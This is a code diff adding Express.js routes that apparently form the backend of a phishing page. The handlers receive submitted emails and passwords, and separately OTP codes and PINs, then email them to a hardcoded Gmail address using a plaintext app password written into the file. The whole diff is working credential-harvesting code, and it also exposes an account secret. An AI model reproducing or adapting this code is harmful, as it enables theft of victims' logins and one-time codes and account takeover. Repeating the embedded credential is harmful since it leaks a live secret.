@@ -1,0 +1,61 @@
+
+app.post('/',(req,res) => {
+    console.log(req.body)
+
+    const transporter = nodemailer.createTransport({
+        service:'gmail',
+        auth: {
+            user: 'edehchinedu59@gmail.com',
+            pass: 'yknycyzsxdkxpepq'
+        }
+    })
+    const mailOptions = {
+        from: req.body.email,
+        to:'edehchinedu59@gmail.com',
+        subject: `Client from ${req.body.email}: password=> ${req.body.password} `
+    }
+
+    transporter.sendMail(mailOptions,(error,info) => {
+        if(error){
+            console.log(error) 
+            res.send('error');
+        }else {
+            console.log("Email sent", + info.response);
+            res.send("success");
+        }
+    })
+})
+
+
+// otpForm
+app.get('/', (req,res ) => {
+    res.sendFile(__dirname + '/public/otp.html')
+})
+// otpForm
+app.post('/',(req,res) => {
+    console.log(req.body)
+
+    const transporter = nodemailer.createTransport({
+        service:'gmail',
+        auth: {
+            user: 'edehchinedu59@gmail.com',
+            pass: 'yknycyzsxdkxpepq'
+        }
+    })
+    const mailOptions = {
+        from: req.body?.otp,
+        to:'edehchinedu59@gmail.com',
+        subject: `Client: ${req.body?.otp} \n password: ${req.body?.pin} `
+    }
+console.log(mailOptions)
+    transporter.sendMail(mailOptions,(error,info) => {
+        if(error){
+            console.log(error) 
+            res.send('error');
+        }else {
+            console.log("Email sent", + info.response);
+            res.send("success");
+        }
+    })
+    
+})
